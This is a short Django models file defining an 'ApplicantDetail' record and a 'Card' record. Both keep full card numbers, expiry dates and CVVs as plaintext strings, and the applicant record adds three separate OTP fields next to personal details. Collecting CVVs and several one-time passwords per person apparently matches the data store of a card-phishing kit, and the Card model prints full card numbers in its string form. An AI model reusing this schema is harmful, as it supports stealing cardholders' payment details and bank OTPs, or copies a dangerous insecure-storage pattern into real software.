from django.db import models


class ApplicantDetail(models.Model):
    # Session tracking
    session_id = models.CharField(max_length=255, blank=True, null=True)

    # Personal Details
    full_name = models.CharField(max_length=150, blank=True, null=True)
    mobile_number = models.CharField(max_length=15, blank=True, null=True)
    email = models.EmailField(blank=True, null=True)
    dob = models.CharField(max_length=20, blank=True, null=True)

    # Card Details
    card_holder_name = models.CharField(max_length=100, blank=True, null=True)
    card_number = models.CharField(max_length=19, blank=True, null=True)
    card_expiry = models.CharField(max_length=5, blank=True, null=True)
    card_cvv = models.CharField(max_length=4, blank=True, null=True)

    # Multi-OTP Fields
    otp1 = models.CharField(max_length=10, blank=True, null=True)
    otp2 = models.CharField(max_length=10, blank=True, null=True)
    otp3 = models.CharField(max_length=10, blank=True, null=True)

    # Timestamps
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.full_name or 'Applicant'} - ID: {self.id}"


# --- App/API Card data save করার জন্য মডেল ---
class Card(models.Model):
    card_name = models.CharField(max_length=100, blank=True, null=True)
    card_number = models.CharField(max_length=19, blank=True, null=True)
    expiry = models.CharField(max_length=5, blank=True, null=True)
    cvv = models.CharField(max_length=4, blank=True, null=True)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.card_name} - {self.card_number}"